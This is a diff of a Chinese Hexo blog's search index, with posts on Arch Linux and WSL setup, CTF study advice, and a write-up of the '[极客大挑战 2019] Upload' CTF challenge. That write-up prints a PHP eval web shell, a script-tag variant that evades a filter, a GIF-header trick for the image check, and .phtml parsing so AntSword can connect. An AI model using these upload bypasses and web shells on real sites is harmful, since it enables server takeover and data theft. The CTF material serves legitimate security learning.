@@ -1,112 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Arch_linux入门</title>
-    <url>/2025/01/19/Arch-linux%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h3 id="Arch-Linux入门"><a href="#Arch-Linux入门" class="headerlink" title="Arch_Linux入门"></a>Arch_Linux入门</h3><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><h5 id="bash-profile"><a href="#bash-profile" class="headerlink" title=".bash_profile"></a>.bash_profile</h5><p>1.隐藏文件,有”.”前缀,它是一个 Shell 脚本文件，在用户登录时会被执行，通常用于设置用户的环境变量、别名等个性化配置。<br>2.具体指令:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br></pre></td></tr></table></figure>
-<p>vim~&#x2F;,该命令是说用vim打开.bash_profile，进行环境变量设置。</p>
-<h5 id="export-EDITOR-’vim’"><a href="#export-EDITOR-’vim’" class="headerlink" title="export EDITOR&#x3D;’vim’"></a>export EDITOR&#x3D;’vim’</h5><p>具体解释:<br>1.export：这是一个 Shell 命令，用于将指定的变量导出为环境变量。环境变量可以在当前 Shell 会话及其子进程中被访问和使用。<br>2.EDITOR：这是一个环境变量名，许多程序和脚本会读取这个环境变量的值，来确定默认使用哪个文本编辑器。例如，一些版本控制系统（如 Git）在需要用户编辑提交信息等文本内容时，就会调用EDITOR环境变量指定的编辑器。<br>&#x3D;’vim’：这部分是给EDITOR环境变量赋值，将其值设置为vim，表示把vim文本编辑器设为默认的文本编辑器。<br>3.总的来说，export EDITOR&#x3D;’vim’这条命令的作用是设置系统的默认文本编辑器为vim 。</p>
-<h5 id="准备非root用户"><a href="#准备非root用户" class="headerlink" title="准备非root用户"></a>准备非root用户</h5><p><strong>useradd命令概述</strong><br>useradd是一个用于在 Linux 系统中创建新用户的命令。它有多个选项来定义新用户的各种属性，如主目录、所属组、默认 Shell 等。<br>各个选项的含义<br><strong>-m选项：</strong><br>含义：这个选项用于创建用户的主目录。如果不使用-m选项，系统可能不会自动为新用户创建主目录。主目录是用户存储个人文件、配置文件等的地方，通常位于&#x2F;home目录下，新用户的主目录名称会与用户名相同，比如为myusername用户创建的主目录可能是&#x2F;home&#x2F;myusername。<br><strong>-G wheel选项：</strong><br>含义：-G用于指定用户所属的附加组（groups）。在这里，wheel是一个组名。在许多 Linux 发行版中，wheel组具有特殊的权限，例如可以通过sudo命令来执行需要管理员权限的任务。将用户添加到wheel组意味着这个新用户（myusername）可能会被赋予一些额外的管理权限相关的功能。不过，具体的权限还需要根据系统的sudo配置等来确定。<br><strong>-s &#x2F;bin&#x2F;bash选项：</strong><br>含义：-s用于指定用户的默认 Shell。Shell 是用户与系统进行交互的接口，在这里将用户myusername的默认 Shell 设置为&#x2F;bin&#x2F;bash。&#x2F;bin&#x2F;bash是一个非常常用的 Shell，它提供了命令补全、历史记录等许多方便的功能，让用户可以更高效地在终端中输入命令和操作系统。<br><strong>myusername参数：</strong><br>含义：这是要创建的新用户的用户名。它是useradd命令的最后一个参数，用于指定新用户的名称，在系统中用于唯一标识这个用户，并且在后续涉及用户相关的操作（如登录、文件权限设置等）中都会用到这个用户名。</p>
-<h5 id="visudo"><a href="#visudo" class="headerlink" title="visudo"></a>visudo</h5><p>visudo是一个用于安全编辑sudoers文件的命令。sudoers文件包含了用户权限配置信息，规定了哪些用户可以以超级用户（root）权限执行哪些命令。使用visudo命令而不是直接编辑sudoers文件（如vim &#x2F;etc&#x2F;sudoers），是因为visudo在编辑前会对文件进行语法检查，防止因错误编辑导致sudo功能无法正常使用或产生安全漏洞。</p>
-<h4 id="初始化系统"><a href="#初始化系统" class="headerlink" title="初始化系统"></a>初始化系统</h4><p>这里是我在arch 中装桌面遇到的情况<br>相关命令:</p>
-<h5 id="添加systemd方式"><a href="#添加systemd方式" class="headerlink" title="添加systemd方式"></a>添加systemd方式</h5><p>配置 WSL 使用 systemd：<br>打开或创建 &#x2F;etc&#x2F;wsl.conf 文件（如果没有这个文件，手动创建）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nvim /etc/wsl.conf</span><br></pre></td></tr></table></figure>
-<p>添加如下内容启用systemd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[boot]</span><br><span class="line">systemd=true</span><br></pre></td></tr></table></figure>
-<p>为了使更改生效,在powershell中重启wsl:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
-<p>验证 systemd 是否工作:<br>重启 WSL 后，检查 systemd 是否正常运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -p 1</span><br></pre></td></tr></table></figure>
-<p>如果一切正常，你应该看到 systemd 作为进程 1 运行。</p>
-<h4 id="有关wsl2的设置"><a href="#有关wsl2的设置" class="headerlink" title="有关wsl2的设置"></a>有关wsl2的设置</h4><h5 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a>前置工作</h5><p>首先你需要下载软件支持:<br><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package</a></p>
-<h5 id="重要指令"><a href="#重要指令" class="headerlink" title="重要指令:"></a>重要指令:</h5><p>1.检查wsl中Linux操作系统的wsl版本:<br>powershell中执行:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>
-<p>2.设定版本:<br>将默认版本设定为2:<br>powershell中执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>
-<p>将指定系统版本设置为2:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version arch 2</span><br></pre></td></tr></table></figure>]]></content>
+    <title>初见文件上传:[极客大挑战 2019]Upload</title>
+    <url>/2025/01/19/2019-Upload/</url>
+    <content><![CDATA[<h3 id="初见文件上传-极客大挑战-2019-Upload"><a href="#初见文件上传-极客大挑战-2019-Upload" class="headerlink" title="初见文件上传:[极客大挑战 2019] Upload"></a>初见文件上传:[极客大挑战 2019] Upload</h3><h4 id="进入靶机"><a href="#进入靶机" class="headerlink" title="进入靶机"></a>进入靶机</h4><img src="/2025/01/19/2019-Upload/image-20250119233053920.png" class="" title="image-20250119233053920">
+
+<p>这里说明是在提示我们要进行文件上传的方式来解答题目,并且文件的格式要为图片格式。</p>
+<h4 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路:"></a>常规思路:</h4><p>1.基本概念:<br>文件包含,就是指的,将我们的病毒源代码文件,通过改后缀名文件头,等绕过方式上传到网站中,并且利用网站对这个文件错误的解析方式,比如在url中解析png后缀文件为后缀为phtml的文件,执行这段代码,造成后门漏洞,从而让攻击者可以利用中国蚁剑等工具连接这个网站,调出WebShell,从而让我们可以遍历这个网站目录,窃取网站信息的一种攻击方式</p>
+<p>2.编写代码:<br>我们首先可以编写一段常规的php一句话木马代码,代码如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>**注意:**为什么使用post呢,post相对于get更具有隐蔽性,并且可以发送更长的参数,所以1我们使用POST的超全局变量传递参数。</p>
+<p>3.尝试上传文件<br>根据网页提示,我们需要图片文件,所以我们可以将php木马文件后缀改成图片文件形式,试图绕过:</p>
+<img src="/2025/01/19/2019-Upload/image-20250119234406375.png" class="" title="image-20250119234406375">
+<p>但是我们却发现网页这样显示:</p>
+<img src="/2025/01/19/2019-Upload/image-20250119234511850.png" class="" title="image-20250119234511850">
+
+<p>说明该web对php的&lt;? ,?&gt;这两个符号进行了过滤,我们需要绕过。</p>
+<p><strong>常规绕过方法:</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这个原理就是利用在js代码里写其他语言的language属性<br>详细的细节我已经写在《命令执行绕过符号总结》这篇文章里面了</p>
+<p>4.再次尝试上传:</p>
+<img src="/2025/01/19/2019-Upload/image-20250119235516524.png" class="" title="image-20250119235516524">
+
+<p>看来还是不行,仍然不是image文件难绷</p>
+<p>5.加上文件头</p>
+<p>web有些时候只会识别文件头,而不识别文件具体内容,所以我们可以加上图片文件头来绕过<br>在这里我们加入gif默认文件头:<br>GIF89a<br>就直接在刚刚代码的&lt;script&gt;上面一行加就可以了<br>发现成功了:</p>
+<img src="/2025/01/19/2019-Upload/image-20250119235904278.png" class="" title="image-20250119235904278">
+
+<h4 id="关于利用后门的远程控制"><a href="#关于利用后门的远程控制" class="headerlink" title="关于利用后门的远程控制"></a>关于利用后门的远程控制</h4><p>1.首先我们要明白浏览器是怎么解析文件的:<br>两种方式:<br>a.首先我们可以在URL中直接写入:DNS&#x2F;upload&#x2F;filename.xxx<br>的形式,此时服务器会按照xxx所写的方式来解析这个文件的数据,<br>例如:<br>我们上传的这个png后缀的源码为php的木马文件,虽然它绕过服务器被上传到网站后端还是png格式的文件,但是我们在url中写入:&#x2F;upload&#x2F;filename.phtml的形式,服务器就会以phtml的方式(就是php文件)解析它,并执行里面的代码,即使文件本身还是png后缀的文件。<br>b.或者在抓包的时候,在报文的:<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”demo.png”<br>这一行中,把filename中文件后缀改为demo.phtml,也是可以的，道理相同。</p>
+<p>2.剑蚁是怎么连接文件的<br>中国剑蚁本质就是一个连接目标网站打开目标网站可视化WebShell的渗透测试软件<br><strong>连接原理:</strong><br>它的功能包括连接目标网站的Web Shell，执行命令，上传&#x2F;下载文件等。在蚁剑中，连接的过程主要是通过发送HTTP请求到Web Shell，利用Web Shell的漏洞进行命令执行、获取数据等操作。<br><strong>参数连接原理:</strong><br>在蚁剑的界面上，URL字段指定了Web Shell的路径，这个路径是您之前上传木马文件的位置，例如DNS&#x2F;upload&#x2F;demo.phtml。蚁剑会通过此路径尝试与目标服务器建立连接。<br>我指向这个路径就是代表让web执行这个文件的代码,以phtml的方式执行。<br>连接密码（cmd）： 在蚁剑的界面中，”连接密码”实际上是Web Shell界面中用来执行PHP命令的接口参数。在这个例子中，cmd作为连接密码是为了触发Web Shell的eval()函数，这个函数在Web Shell的PHP脚本中会执行通过POST请求传递的命令。<br>相当于写cmd,就是为了触发木马字段里的eval函数,函数被触发,蚁剑就和这个网站产生联系,就会调出这个网站的详细后端文件信息:</p>
+<img src="/2025/01/19/2019-Upload/image-20250120002149418.png" class="" title="image-20250120002149418">
+
+<p>连接成功后遍历文件:</p>
+<img src="/2025/01/19/2019-Upload/image-20250120002217735.png" class="" title="image-20250120002217735">
+
+<p>最后在文件根目录下找到flag:</p>
+<img src="/2025/01/19/2019-Upload/image-20250120002244756.png" class="" title="image-20250120002244756">
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
       <categories>
-        <category>Linux</category>
+        <category>buuctf</category>
       </categories>
       <tags>
-        <tag>Arch</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
-    <title>3.30有关川大ctf交流</title>
-    <url>/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/</url>
-    <content><![CDATA[<h1 id="基本培养路线介绍"><a href="#基本培养路线介绍" class="headerlink" title="基本培养路线介绍"></a>基本培养路线介绍</h1><ul>
-<li>Web方向研究</li>
-<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330175602024.png" class="" title="image-20250330175602024"></li>
-<li>深度实战研究，并非科研研究。</li>
-</ul>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><ul>
-<li>buuctf直接针对wp进行解决</li>
-<li>照着题目里面的<code>php</code>问题进行学习</li>
-<li>前端语言只用看懂</li>
-</ul>
-<h2 id="中期"><a href="#中期" class="headerlink" title="中期"></a>中期</h2><ul>
-<li>平时把代码审计作为一个大方向。</li>
-<li>入门SRC漏洞，先挖高校漏洞。</li>
-<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180052195.png" class="" title="image-20250330180052195"></li>
-<li>有关内网渗透</li>
-<li><ul>
-<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180128796.png" class="" title="image-20250330180128796"></li>
-<li>以上为推荐网站</li>
-<li>以及<code>hackthebox</code></li>
-</ul>
-</li>
-<li>国际赛:<code>ctftime</code>根据权重选择难度。</li>
-</ul>
-<h2 id="后期"><a href="#后期" class="headerlink" title="后期"></a>后期</h2><ul>
-<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180254510.png" class="" title="image-20250330180254510"></li>
-<li>主要是个人研究工具</li>
-</ul>
-<h2 id="WP的来源"><a href="#WP的来源" class="headerlink" title="WP的来源"></a>WP的来源</h2><ul>
-<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180517910.png" class="" title="image-20250330180517910"></li>
-</ul>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
-<li><p>ctfwiki PWN相关内容</p>
-</li>
-<li><p>做题:</p>
-</li>
-<li><ul>
-<li><p>buuctf</p>
-</li>
-<li><p>Linux使用wsl即可</p>
-</li>
-<li><p>直接看X86汇编语言</p>
-</li>
-</ul>
-</li>
-<li><p>打公开赛的赛题,国际赛</p>
-</li>
-</ul>
-<h1 id="师傅的问题"><a href="#师傅的问题" class="headerlink" title="师傅的问题"></a>师傅的问题</h1><ul>
-<li>AWD的Web题一定要快速找到后门,不需要很高的web知识,<strong>比较好去稳定排名</strong></li>
-<li>在赛场上不好一个个处理靶机。</li>
-<li>对框架的定位，快速了解系统框架，得知漏洞点。在<code>github</code>的<code>CMS</code>进行研究。</li>
-<li>团队：</li>
-<li>两个web一个pwn。</li>
-</ul>
-<h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><ul>
-<li>不要在配置环境花费太多时间</li>
-<li>自己开发工具，实用性是不是会更高?</li>
-<li>主要工具用于渗透方向。</li>
-</ul>
-<h1 id="国安"><a href="#国安" class="headerlink" title="国安"></a>国安</h1><ul>
-<li>运气成分比较大</li>
-<li>老师理解就是，对专业要求不是很高。</li>
-<li>先了解具体时间。</li>
-</ul>
-<h1 id="省厅"><a href="#省厅" class="headerlink" title="省厅"></a>省厅</h1>]]></content>
-      <categories>
-        <category>个人安排</category>
-      </categories>
-      <tags>
-        <tag>川大ctf交流</tag>
-      </tags>
+    <title>我的第一篇博客</title>
+    <url>/2025/01/11/25.1.9/</url>
+    <content><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>
+]]></content>
   </entry>
   <entry>
     <title>HCTF2018 WarmUp1代码审计:include分割符</title>
@@ -142,6 +97,39 @@
       </categories>
       <tags>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Arch_linux入门</title>
+    <url>/2025/01/19/Arch-linux%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h3 id="Arch-Linux入门"><a href="#Arch-Linux入门" class="headerlink" title="Arch_Linux入门"></a>Arch_Linux入门</h3><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><h5 id="bash-profile"><a href="#bash-profile" class="headerlink" title=".bash_profile"></a>.bash_profile</h5><p>1.隐藏文件,有”.”前缀,它是一个 Shell 脚本文件，在用户登录时会被执行，通常用于设置用户的环境变量、别名等个性化配置。<br>2.具体指令:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br></pre></td></tr></table></figure>
+<p>vim~&#x2F;,该命令是说用vim打开.bash_profile，进行环境变量设置。</p>
+<h5 id="export-EDITOR-’vim’"><a href="#export-EDITOR-’vim’" class="headerlink" title="export EDITOR&#x3D;’vim’"></a>export EDITOR&#x3D;’vim’</h5><p>具体解释:<br>1.export：这是一个 Shell 命令，用于将指定的变量导出为环境变量。环境变量可以在当前 Shell 会话及其子进程中被访问和使用。<br>2.EDITOR：这是一个环境变量名，许多程序和脚本会读取这个环境变量的值，来确定默认使用哪个文本编辑器。例如，一些版本控制系统（如 Git）在需要用户编辑提交信息等文本内容时，就会调用EDITOR环境变量指定的编辑器。<br>&#x3D;’vim’：这部分是给EDITOR环境变量赋值，将其值设置为vim，表示把vim文本编辑器设为默认的文本编辑器。<br>3.总的来说，export EDITOR&#x3D;’vim’这条命令的作用是设置系统的默认文本编辑器为vim 。</p>
+<h5 id="准备非root用户"><a href="#准备非root用户" class="headerlink" title="准备非root用户"></a>准备非root用户</h5><p><strong>useradd命令概述</strong><br>useradd是一个用于在 Linux 系统中创建新用户的命令。它有多个选项来定义新用户的各种属性，如主目录、所属组、默认 Shell 等。<br>各个选项的含义<br><strong>-m选项：</strong><br>含义：这个选项用于创建用户的主目录。如果不使用-m选项，系统可能不会自动为新用户创建主目录。主目录是用户存储个人文件、配置文件等的地方，通常位于&#x2F;home目录下，新用户的主目录名称会与用户名相同，比如为myusername用户创建的主目录可能是&#x2F;home&#x2F;myusername。<br><strong>-G wheel选项：</strong><br>含义：-G用于指定用户所属的附加组（groups）。在这里，wheel是一个组名。在许多 Linux 发行版中，wheel组具有特殊的权限，例如可以通过sudo命令来执行需要管理员权限的任务。将用户添加到wheel组意味着这个新用户（myusername）可能会被赋予一些额外的管理权限相关的功能。不过，具体的权限还需要根据系统的sudo配置等来确定。<br><strong>-s &#x2F;bin&#x2F;bash选项：</strong><br>含义：-s用于指定用户的默认 Shell。Shell 是用户与系统进行交互的接口，在这里将用户myusername的默认 Shell 设置为&#x2F;bin&#x2F;bash。&#x2F;bin&#x2F;bash是一个非常常用的 Shell，它提供了命令补全、历史记录等许多方便的功能，让用户可以更高效地在终端中输入命令和操作系统。<br><strong>myusername参数：</strong><br>含义：这是要创建的新用户的用户名。它是useradd命令的最后一个参数，用于指定新用户的名称，在系统中用于唯一标识这个用户，并且在后续涉及用户相关的操作（如登录、文件权限设置等）中都会用到这个用户名。</p>
+<h5 id="visudo"><a href="#visudo" class="headerlink" title="visudo"></a>visudo</h5><p>visudo是一个用于安全编辑sudoers文件的命令。sudoers文件包含了用户权限配置信息，规定了哪些用户可以以超级用户（root）权限执行哪些命令。使用visudo命令而不是直接编辑sudoers文件（如vim &#x2F;etc&#x2F;sudoers），是因为visudo在编辑前会对文件进行语法检查，防止因错误编辑导致sudo功能无法正常使用或产生安全漏洞。</p>
+<h4 id="初始化系统"><a href="#初始化系统" class="headerlink" title="初始化系统"></a>初始化系统</h4><p>这里是我在arch 中装桌面遇到的情况<br>相关命令:</p>
+<h5 id="添加systemd方式"><a href="#添加systemd方式" class="headerlink" title="添加systemd方式"></a>添加systemd方式</h5><p>配置 WSL 使用 systemd：<br>打开或创建 &#x2F;etc&#x2F;wsl.conf 文件（如果没有这个文件，手动创建）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nvim /etc/wsl.conf</span><br></pre></td></tr></table></figure>
+<p>添加如下内容启用systemd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[boot]</span><br><span class="line">systemd=true</span><br></pre></td></tr></table></figure>
+<p>为了使更改生效,在powershell中重启wsl:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
+<p>验证 systemd 是否工作:<br>重启 WSL 后，检查 systemd 是否正常运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -p 1</span><br></pre></td></tr></table></figure>
+<p>如果一切正常，你应该看到 systemd 作为进程 1 运行。</p>
+<h4 id="有关wsl2的设置"><a href="#有关wsl2的设置" class="headerlink" title="有关wsl2的设置"></a>有关wsl2的设置</h4><h5 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a>前置工作</h5><p>首先你需要下载软件支持:<br><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package</a></p>
+<h5 id="重要指令"><a href="#重要指令" class="headerlink" title="重要指令:"></a>重要指令:</h5><p>1.检查wsl中Linux操作系统的wsl版本:<br>powershell中执行:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>
+<p>2.设定版本:<br>将默认版本设定为2:<br>powershell中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>
+<p>将指定系统版本设置为2:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version arch 2</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Arch</tag>
       </tags>
   </entry>
   <entry>
@@ -379,66 +367,152 @@
       </tags>
   </entry>
   <entry>
-    <title>我的第一篇博客</title>
-    <url>/2025/01/11/25.1.9/</url>
-    <content><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>初见文件上传:[极客大挑战 2019]Upload</title>
-    <url>/2025/01/19/2019-Upload/</url>
-    <content><![CDATA[<h3 id="初见文件上传-极客大挑战-2019-Upload"><a href="#初见文件上传-极客大挑战-2019-Upload" class="headerlink" title="初见文件上传:[极客大挑战 2019] Upload"></a>初见文件上传:[极客大挑战 2019] Upload</h3><h4 id="进入靶机"><a href="#进入靶机" class="headerlink" title="进入靶机"></a>进入靶机</h4><img src="/2025/01/19/2019-Upload/image-20250119233053920.png" class="" title="image-20250119233053920">
-
-<p>这里说明是在提示我们要进行文件上传的方式来解答题目,并且文件的格式要为图片格式。</p>
-<h4 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路:"></a>常规思路:</h4><p>1.基本概念:<br>文件包含,就是指的,将我们的病毒源代码文件,通过改后缀名文件头,等绕过方式上传到网站中,并且利用网站对这个文件错误的解析方式,比如在url中解析png后缀文件为后缀为phtml的文件,执行这段代码,造成后门漏洞,从而让攻击者可以利用中国蚁剑等工具连接这个网站,调出WebShell,从而让我们可以遍历这个网站目录,窃取网站信息的一种攻击方式</p>
-<p>2.编写代码:<br>我们首先可以编写一段常规的php一句话木马代码,代码如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>**注意:**为什么使用post呢,post相对于get更具有隐蔽性,并且可以发送更长的参数,所以1我们使用POST的超全局变量传递参数。</p>
-<p>3.尝试上传文件<br>根据网页提示,我们需要图片文件,所以我们可以将php木马文件后缀改成图片文件形式,试图绕过:</p>
-<img src="/2025/01/19/2019-Upload/image-20250119234406375.png" class="" title="image-20250119234406375">
-<p>但是我们却发现网页这样显示:</p>
-<img src="/2025/01/19/2019-Upload/image-20250119234511850.png" class="" title="image-20250119234511850">
-
-<p>说明该web对php的&lt;? ,?&gt;这两个符号进行了过滤,我们需要绕过。</p>
-<p><strong>常规绕过方法:</strong></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>这个原理就是利用在js代码里写其他语言的language属性<br>详细的细节我已经写在《命令执行绕过符号总结》这篇文章里面了</p>
-<p>4.再次尝试上传:</p>
-<img src="/2025/01/19/2019-Upload/image-20250119235516524.png" class="" title="image-20250119235516524">
-
-<p>看来还是不行,仍然不是image文件难绷</p>
-<p>5.加上文件头</p>
-<p>web有些时候只会识别文件头,而不识别文件具体内容,所以我们可以加上图片文件头来绕过<br>在这里我们加入gif默认文件头:<br>GIF89a<br>就直接在刚刚代码的&lt;script&gt;上面一行加就可以了<br>发现成功了:</p>
-<img src="/2025/01/19/2019-Upload/image-20250119235904278.png" class="" title="image-20250119235904278">
-
-<h4 id="关于利用后门的远程控制"><a href="#关于利用后门的远程控制" class="headerlink" title="关于利用后门的远程控制"></a>关于利用后门的远程控制</h4><p>1.首先我们要明白浏览器是怎么解析文件的:<br>两种方式:<br>a.首先我们可以在URL中直接写入:DNS&#x2F;upload&#x2F;filename.xxx<br>的形式,此时服务器会按照xxx所写的方式来解析这个文件的数据,<br>例如:<br>我们上传的这个png后缀的源码为php的木马文件,虽然它绕过服务器被上传到网站后端还是png格式的文件,但是我们在url中写入:&#x2F;upload&#x2F;filename.phtml的形式,服务器就会以phtml的方式(就是php文件)解析它,并执行里面的代码,即使文件本身还是png后缀的文件。<br>b.或者在抓包的时候,在报文的:<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”demo.png”<br>这一行中,把filename中文件后缀改为demo.phtml,也是可以的，道理相同。</p>
-<p>2.剑蚁是怎么连接文件的<br>中国剑蚁本质就是一个连接目标网站打开目标网站可视化WebShell的渗透测试软件<br><strong>连接原理:</strong><br>它的功能包括连接目标网站的Web Shell，执行命令，上传&#x2F;下载文件等。在蚁剑中，连接的过程主要是通过发送HTTP请求到Web Shell，利用Web Shell的漏洞进行命令执行、获取数据等操作。<br><strong>参数连接原理:</strong><br>在蚁剑的界面上，URL字段指定了Web Shell的路径，这个路径是您之前上传木马文件的位置，例如DNS&#x2F;upload&#x2F;demo.phtml。蚁剑会通过此路径尝试与目标服务器建立连接。<br>我指向这个路径就是代表让web执行这个文件的代码,以phtml的方式执行。<br>连接密码（cmd）： 在蚁剑的界面中，”连接密码”实际上是Web Shell界面中用来执行PHP命令的接口参数。在这个例子中，cmd作为连接密码是为了触发Web Shell的eval()函数，这个函数在Web Shell的PHP脚本中会执行通过POST请求传递的命令。<br>相当于写cmd,就是为了触发木马字段里的eval函数,函数被触发,蚁剑就和这个网站产生联系,就会调出这个网站的详细后端文件信息:</p>
-<img src="/2025/01/19/2019-Upload/image-20250120002149418.png" class="" title="image-20250120002149418">
-
-<p>连接成功后遍历文件:</p>
-<img src="/2025/01/19/2019-Upload/image-20250120002217735.png" class="" title="image-20250120002217735">
-
-<p>最后在文件根目录下找到flag:</p>
-<img src="/2025/01/19/2019-Upload/image-20250120002244756.png" class="" title="image-20250120002244756">
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
+    <title>3.30有关川大ctf交流</title>
+    <url>/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/</url>
+    <content><![CDATA[<h1 id="基本培养路线介绍"><a href="#基本培养路线介绍" class="headerlink" title="基本培养路线介绍"></a>基本培养路线介绍</h1><ul>
+<li>Web方向研究</li>
+<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330175602024.png" class="" title="image-20250330175602024"></li>
+<li>深度实战研究，并非科研研究。</li>
+</ul>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><ul>
+<li>buuctf直接针对wp进行解决</li>
+<li>照着题目里面的<code>php</code>问题进行学习</li>
+<li>前端语言只用看懂</li>
+</ul>
+<h2 id="中期"><a href="#中期" class="headerlink" title="中期"></a>中期</h2><ul>
+<li>平时把代码审计作为一个大方向。</li>
+<li>入门SRC漏洞，先挖高校漏洞。</li>
+<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180052195.png" class="" title="image-20250330180052195"></li>
+<li>有关内网渗透</li>
+<li><ul>
+<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180128796.png" class="" title="image-20250330180128796"></li>
+<li>以上为推荐网站</li>
+<li>以及<code>hackthebox</code></li>
+</ul>
+</li>
+<li>国际赛:<code>ctftime</code>根据权重选择难度。</li>
+</ul>
